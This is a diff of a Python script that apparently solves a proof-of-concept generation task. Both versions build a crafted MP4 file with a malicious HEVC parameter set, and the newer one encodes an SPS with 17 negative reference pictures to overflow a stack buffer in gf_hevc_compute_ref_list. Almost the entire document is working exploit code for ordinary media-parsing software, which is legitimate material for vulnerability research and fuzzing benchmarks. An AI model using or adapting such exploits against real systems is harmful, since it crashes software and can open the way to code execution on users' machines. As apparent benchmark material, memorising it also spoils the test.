@@ -1,144 +1,203 @@
 import struct
 
 class Solution:
-    """
-    Generates a Proof-of-Concept input to trigger a Stack Buffer Overflow
-    in gf_hevc_compute_ref_list() by crafting an MP4 file with a malicious
-    HEVC Picture Parameter Set (PPS).
-    """
     def solve(self, src_path: str) -> bytes:
         """
-        Generates a PoC that triggers the vulnerability.
+        Generates a Proof-of-Concept MP4 file that triggers a stack buffer
+        overflow in the HEVC SPS (Sequence Parameter Set) parsing logic.
 
-        Args:
-            src_path: Path to the vulnerable source code tarball (unused).
+        The vulnerability exists in `gf_hevc_compute_ref_list`, which is called
+        when processing an HEVC stream. The function does not properly validate
+        the number of reference pictures specified in the Short-Term Reference
+        Picture Set (ST-RPS) part of the SPS.
 
-        Returns:
-            bytes: The PoC input that should trigger the vulnerability.
+        This PoC constructs a minimal MP4 file with an HEVC track. The track's
+        decoder configuration (`hvcC` box) contains a specially crafted SPS
+        NAL unit. In this SPS, we define one ST-RPS and set its
+        `num_negative_pics` field to 17, which is a value greater than the
+        expected maximum (typically 16). This causes the function to write
+        past the end of a stack-allocated buffer when it tries to process
+        this reference picture list, leading to a crash.
         """
-        
+
+        class Bitstream:
+            """A helper class to write bit-packed data for HEVC NAL units."""
+            def __init__(self):
+                self.bits = ""
+
+            def write(self, value, num_bits):
+                self.bits += bin(value)[2:].zfill(num_bits)
+
+            def write_ue(self, value):
+                # Unsigned Exp-Golomb encoding
+                v_plus_1 = value + 1
+                binary_str = bin(v_plus_1)[2:]
+                self.bits += '0' * (len(binary_str) - 1)
+                self.bits += binary_str
+
+            def write_se(self, value):
+                # Signed Exp-Golomb encoding
+                if value <= 0:
+                    code = -2 * value
+                else:
+                    code = 2 * value - 1
+                self.write_ue(code)
+
+            def get_bytes(self):
+                # Finalize the bitstream with a stop bit and padding
+                # to form a Raw Byte Sequence Payload (RBSP).
+                res = self.bits + '1'
+                while len(res) % 8 != 0:
+                    res += '0'
+                
+                b_arr = bytearray()
+                for i in range(0, len(res), 8):
+                    b_arr.append(int(res[i:i+8], 2))
+                return bytes(b_arr)
+
         def box(box_type: bytes, content: bytes) -> bytes:
-            """Helper function to create an ISO BMFF box."""
+            """Creates a simple MP4 box."""
             return struct.pack('>I', len(content) + 8) + box_type + content
 
-        # --- HEVC NAL (Network Abstraction Layer) Units ---
+        def full_box(box_type: bytes, version: int, flags: int, content: bytes) -> bytes:
+            """Creates a versioned MP4 box (full box)."""
+            return box(box_type, struct.pack('>I', (version << 24) | flags) + content)
 
-        # A minimal valid Video Parameter Set (VPS)
-        NAL_VPS = b'\x40\x01\x0c\x01\xff\xff\x01\x60\x00\x00\x03\x00\xb0\x00\x00\x03\x00\x00\x03\x00\x78\xac\x09'
+        # 1. Craft HEVC NAL Units
+        # Use a minimal, known-good VPS NAL unit.
+        vps_nalu = bytes.fromhex('40010c01ffff016000000300b0000003000003005dacf9')
+
+        # Craft the malicious SPS NAL unit programmatically.
+        sps = Bitstream()
+        sps.write(0, 1)    # forbidden_zero_bit
+        sps.write(33, 6)   # nal_unit_type = SPS
+        sps.write(0, 6)    # nuh_layer_id
+        sps.write(1, 3)    # nuh_temporal_id_plus1
+        sps.write(0, 4)    # sps_video_parameter_set_id
+        sps.write(0, 3)    # sps_max_sub_layers_minus1
+        sps.write(1, 1)    # sps_temporal_id_nesting_flag
+        # profile_tier_level
+        sps.write(0, 2)    # general_profile_space
+        sps.write(0, 1)    # general_tier_flag
+        sps.write(1, 5)    # general_profile_idc (Main)
+        sps.write(0x60000000, 32) # general_profile_compatibility_flags
+        sps.write(0, 48)   # general_constraint_indicator_flags
+        sps.write(30, 8)   # general_level_idc (Level 1)
+        sps.write_ue(0)    # sps_seq_parameter_set_id
+        sps.write_ue(1)    # chroma_format_idc
+        sps.write(0, 1)    # separate_colour_plane_flag
+        sps.write_ue(63)   # pic_width_in_luma_samples (64)
+        sps.write_ue(63)   # pic_height_in_luma_samples (64)
+        sps.write(0, 1)    # conformance_window_flag
+        sps.write_ue(15)   # sps_max_dec_pic_buffering_minus1[0]
+        sps.write_ue(0)    # sps_max_num_reorder_pics[0]
+        sps.write_ue(0)    # sps_max_latency_increase_plus1[0]
+        sps.write_ue(0)    # log2_min_luma_coding_block_size_minus3
+        sps.write_ue(3)    # log2_diff_max_min_luma_coding_block_size
+        sps.write_ue(0)    # log2_min_transform_block_size_minus2
+        sps.write_ue(2)    # log2_diff_max_min_transform_block_size
+        sps.write_ue(0)    # max_transform_hierarchy_depth_inter
+        sps.write_ue(0)    # max_transform_hierarchy_depth_intra
+        sps.write(0, 1)    # scaling_list_enabled_flag
+        sps.write(1, 1)    # amp_enabled_flag
+        sps.write(0, 1)    # sample_adaptive_offset_enabled_flag
+        sps.write(0, 1)    # pcm_enabled_flag
+
+        # VULNERABILITY PAYLOAD: Define a short-term reference picture set
+        # with more pictures than the stack buffer can hold.
+        sps.write_ue(1)    # num_short_term_ref_pic_sets
+        sps.write(0, 1)    # inter_ref_pic_set_prediction_flag
+        sps.write_ue(17)   # num_negative_pics (TRIGGER > 16)
+        sps.write_ue(0)    # num_positive_pics
+        # Provide placeholder delta POCs for the parser to proceed
+        for _ in range(17):
+            sps.write_ue(0) # delta_poc_s0_minus1[i]
+            sps.write(1, 1) # used_by_curr_pic_s0_flag[i]
         
-        # A minimal valid Sequence Parameter Set (SPS)
-        NAL_SPS = b'\x42\x01\x01\x01\x60\x00\x00\x03\x00\xb0\x00\x00\x03\x00\x00\x03\x00\x78\xa0\x03\xc0\x80\x10\xe5\xa6\x49\x90'
+        sps.write(0, 1)    # long_term_ref_pics_present_flag
+        sps.write(0, 1)    # sps_temporal_mvp_enabled_flag
+        sps.write(0, 1)    # strong_intra_smoothing_enabled_flag
+        sps.write(0, 1)    # vui_parameters_present_flag
+        sps.write(0, 1)    # sps_extension_present_flag
+        sps_nalu = sps.get_bytes()
+
+        # Craft a minimal PPS NAL unit.
+        pps = Bitstream()
+        pps.write(0, 1); pps.write(34, 6); pps.write(0, 6); pps.write(1, 3)
+        pps.write_ue(0); pps.write_ue(0); pps.write(0, 1); pps.write(0, 1)
+        pps.write(0, 3); pps.write(0, 1); pps.write(0, 1); pps.write_ue(0)
+        pps.write_ue(0); pps.write_se(0); pps.write(0, 1); pps.write(0, 1)
+        pps.write(1, 1); pps.write_ue(0); pps.write_se(0); pps.write_se(0)
+        pps.write(0, 1); pps.write(0, 1); pps.write(0, 1); pps.write(0, 1)
+        pps.write(0, 1); pps.write(0, 1); pps.write(0, 1); pps.write(0, 1)
+        pps.write(0, 1); pps.write(0, 1); pps.write_ue(0); pps.write(0, 1)
+        pps.write(0, 1)
+        pps_nalu = pps.get_bytes()
+
+        # 2. Assemble the hvcC (HEVC Decoder Configuration) box
+        hvcC_content = (
+            b'\x01' +                          # configurationVersion
+            b'\x01' +                          # general_profile_space, tier, idc
+            (0x60000000).to_bytes(4, 'big') +  # general_profile_compatibility_flags
+            (0).to_bytes(6, 'big') +           # general_constraint_indicator_flags
+            (30).to_bytes(1, 'big') +          # general_level_idc
+            b'\xf0\x00' +                      # min_spatial_segmentation_idc
+            b'\xfc' +                          # parallelismType
+            b'\xfc' +                          # chromaFormat
+            b'\xf8' +                          # bitDepthLumaMinus8
+            b'\xf8' +                          # bitDepthChromaMinus8
+            b'\x00\x00' +                      # avgFrameRate
+            b'\x03' +                          # constantFrameRate, ..., lengthSizeMinusOne=3
+            b'\x03' +                          # numOfArrays (VPS, SPS, PPS)
+            # VPS Array
+            b'\xa0' + struct.pack('>HH', 1, len(vps_nalu)) + vps_nalu +
+            # SPS Array
+            b'\xa1' + struct.pack('>HH', 1, len(sps_nalu)) + sps_nalu +
+            # PPS Array
+            b'\xa2' + struct.pack('>HH', 1, len(pps_nalu)) + pps_nalu
+        )
+        hvcC = box(b'hvcC', hvcC_content)
+
+        # 3. Assemble the full MP4 file structure
+        ftyp = box(b'ftyp', b'isom\x00\x00\x00\x01isomiso2avc1mp41')
+        mdat = box(b'mdat', b'')
+
+        mvhd_matrix = b'\x00\x01\x00\x00' + b'\x00'*12 + b'\x00\x01\x00\x00' + b'\x00'*12 + b'\x40\x00\x00\x00'
+        mvhd = full_box(b'mvhd', 0, 0,
+            b'\x00'*8 + struct.pack('>II', 1000, 0) +
+            b'\x00\x01\x00\x00\x01\x00' + b'\x00'*10 +
+            mvhd_matrix + b'\x00'*24 + struct.pack('>I', 2))
         
-        # A malicious Picture Parameter Set (PPS). It has been crafted to contain
-        # a `num_ref_idx_l0_default_active_minus1` value far greater than the
-        # maximum allowed value of 15. This oversized value causes the vulnerable
-        # function to write past the bounds of a stack-allocated array.
-        NAL_PPS = b'\x44\x01\xee\xff\xbf\xe8\x40'
-        
-        # A minimal P-slice that references the malicious PPS (ID 0) to trigger its processing.
-        NAL_SLICE = b'\x02\x01\x84\x08\x00'
+        tkhd = full_box(b'tkhd', 0, 15,
+            b'\x00'*8 + struct.pack('>II', 1, 0) + b'\x00'*16 +
+            mvhd_matrix + struct.pack('>II', 64 << 16, 64 << 16))
 
-        def build_poc_parts(mdat_offset: int) -> tuple[bytes, bytes]:
-            """Builds the header and mdat sections of the MP4 file for a given mdat offset."""
-            
-            # --- Build hvcC (HEVC Decoder Configuration Record) ---
-            # This record stores the VPS, SPS, and PPS for the decoder.
-            hvcC_arrays = b''
-            # VPS array
-            hvcC_arrays += b'\x20'  # array_completeness=0, NALUnitType=32 (VPS)
-            hvcC_arrays += struct.pack('>H', 1)  # numNalus
-            hvcC_arrays += struct.pack('>H', len(NAL_VPS)) + NAL_VPS
-            # SPS array
-            hvcC_arrays += b'\x21'  # NALUnitType=33 (SPS)
-            hvcC_arrays += struct.pack('>H', 1)  # numNalus
-            hvcC_arrays += struct.pack('>H', len(NAL_SPS)) + NAL_SPS
-            # PPS array (malicious)
-            hvcC_arrays += b'\x22'  # NALUnitType=34 (PPS)
-            hvcC_arrays += struct.pack('>H', 1)  # numNalus
-            hvcC_arrays += struct.pack('>H', len(NAL_PPS)) + NAL_PPS
+        mdhd = full_box(b'mdhd', 0, 0,
+            b'\x00'*8 + struct.pack('>II', 1000, 0) + b'\x55\xc4\x00\x00')
 
-            hvcC_config = (
-                b'\x01' +                          # configurationVersion
-                b'\x01\x60\x00\x00\x00' +          # general_profile_space, tier_flag, profile_idc, etc
-                b'\xb0\x00\x00\x00\x00\x00' +      # general_constraint_indicator_flags
-                b'\x78' +                          # general_level_idc
-                b'\xf0\x00' +                      # min_spatial_segmentation_idc
-                b'\xfc' +                          # parallelismType
-                b'\xfc' +                          # chromaFormat
-                b'\xf8' +                          # bitDepthLumaMinus8
-                b'\xf8' +                          # bitDepthChromaMinus8
-                b'\x00\x00' +                      # avgFrameRate
-                b'\xdd' +                          # constantFrameRate, numTemporalLayers, temporalIdNested, lengthSizeMinusOne=3 (4 bytes)
-                b'\x03' +                          # numOfArrays
-                hvcC_arrays
-            )
-            hvcC = box(b'hvcC', hvcC_config)
+        hdlr = full_box(b'hdlr', 0, 0,
+            b'\x00'*4 + b'vide' + b'\x00'*12 + b'VideoHandler\x00')
 
-            # --- Build stsd (Sample Description Box) ---
-            hvc1_content = (
-                b'\x00' * 6 + b'\x00\x01' +       # Reserved, data_reference_index
-                b'\x00' * 16 +                    # Pre-defined
-                b'\x00\x20\x00\x20' +             # width, height (32x32)
-                b'\x00\x48\x00\x00' * 2 +         # horiz/vert resolution
-                b'\x00' * 4 + b'\x00\x01' +       # Reserved, frame_count
-                b'\x00' * 32 +                    # compressorname
-                b'\x00\x18\xff\xff' +             # depth, pre-defined
-                hvcC
-            )
-            hvc1 = box(b'hvc1', hvc1_content)
-            stsd = box(b'stsd', b'\x00\x00\x00\x00\x00\x00\x00\x01' + hvc1)
-            
-            # --- Build stbl (Sample Table Box) ---
-            stts = box(b'stts', b'\x00' * 8) # Time-to-Sample
-            stsc = box(b'stsc', b'\x00' * 8) # Sample-to-Chunk
-            stsz = box(b'stsz', b'\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', len(NAL_SLICE))) # Sample Size
-            stco = box(b'stco', b'\x00\x00\x00\x00\x00\x00\x00\x01' + struct.pack('>I', mdat_offset)) # Chunk Offset
-            stbl = box(b'stbl', stsd + stts + stsc + stsz + stco)
-            
-            # --- Build minf (Media Information Box) ---
-            vmhd = box(b'vmhd', b'\x00\x00\x00\x01' + b'\x00' * 8) # Video Media Header
-            dref_url = box(b'url ', b'\x00\x00\x00\x01')
-            dref = box(b'dref', b'\x00\x00\x00\x00\x00\x00\x00\x01' + dref_url)
-            dinf = box(b'dinf', dref) # Data Information Box
-            minf = box(b'minf', vmhd + dinf + stbl)
-            
-            # --- Build mdia (Media Box) ---
-            mdhd = box(b'mdhd', b'\x00'*12 + b'\x00\x00\x03\xe8\x00\x01\x00\x00\x55\xc4\x00\x00') # Media Header
-            hdlr = box(b'hdlr', b'\x00'*8 + b'vide' + b'\x00'*12 + b'VideoHandler\x00') # Handler
-            mdia = box(b'mdia', mdhd + hdlr + minf)
+        vmhd = full_box(b'vmhd', 0, 1, b'\x00'*8)
+        dref_entry = full_box(b'url ', 0, 1, b'')
+        dref = full_box(b'dref', 0, 0, struct.pack('>I', 1) + dref_entry)
+        dinf = box(b'dinf', dref)
 
-            # --- Build trak (Track Box) ---
-            tkhd = box(b'tkhd', b'\x00\x00\x00\x0f' + b'\x00'*12 + b'\x00\x01' + b'\x00'*52 + b'\x40\x00\x00\x00' + b'\x00\x20\x00\x00\x00\x20\x00\x00') # Track Header
-            trak = box(b'trak', tkhd + mdia)
+        hev1 = box(b'hev1',
+            b'\x00'*6 + struct.pack('>H', 1) + b'\x00'*16 +
+            struct.pack('>HH', 64, 64) +
+            b'\x00\x48\x00\x00\x00\x48\x00\x00' + b'\x00'*4 +
+            struct.pack('>H', 1) + b'\x00'*32 + hvcC)
+        stsd = full_box(b'stsd', 0, 0, struct.pack('>I', 1) + hev1)
+        stts = full_box(b'stts', 0, 0, b'\x00\x00\x00\x00')
+        stsc = full_box(b'stsc', 0, 0, b'\x00\x00\x00\x00')
+        stsz = full_box(b'stsz', 0, 0, b'\x00\x00\x00\x00\x00\x00\x00\x00')
+        stco = full_box(b'stco', 0, 0, b'\x00\x00\x00\x00')
 
-            # --- Build moov (Movie Box) ---
-            mvhd = box(b'mvhd', b'\x00'*12 + b'\x00\x01\x5f\x90\x00\x00\x03\xe8' + b'\x00\x01\x00\x00' + b'\x01\x00' + b'\x00'*62 + b'\x02') # Movie Header
-            moov = box(b'moov', mvhd + trak)
+        stbl = box(b'stbl', stsd + stts + stsc + stsz + stco)
+        minf = box(b'minf', vmhd + dinf + stbl)
+        mdia = box(b'mdia', mdhd + hdlr + minf)
+        trak = box(b'trak', tkhd + mdia)
+        moov = box(b'moov', mvhd + trak)
 
-            # --- Build ftyp (File Type Box) ---
-            ftyp = box(b'ftyp', b'isom\x00\x00\x00\x00isomiso2avc1mp41')
-
-            # --- Build mdat (Media Data Box) ---
-            mdat_content = struct.pack('>I', len(NAL_SLICE)) + NAL_SLICE
-            mdat = box(b'mdat', mdat_content)
-            
-            header = ftyp + moov
-            return header, mdat
-
-        # The size of the MP4 header depends on the stco box, which contains the
-        # offset to the mdat box, which itself depends on the size of the header.
-        # We can resolve this by calculating the header size with a dummy offset,
-        # then using that size to find the real offset and rebuilding the file.
-        # Since the size of the offset value itself is fixed (4 bytes), one
-        # iteration is sufficient.
-
-        # 1. Build with a dummy offset to calculate header size
-        header_dummy, _ = build_poc_parts(0)
-        
-        # 2. Calculate the final offset
-        final_offset = len(header_dummy) + 8 # +8 for mdat box header (size+type)
-        
-        # 3. Build the final PoC with the correct offset
-        final_header, final_mdat = build_poc_parts(final_offset)
-        
-        return final_header + final_mdat
+        return ftyp + moov + mdat
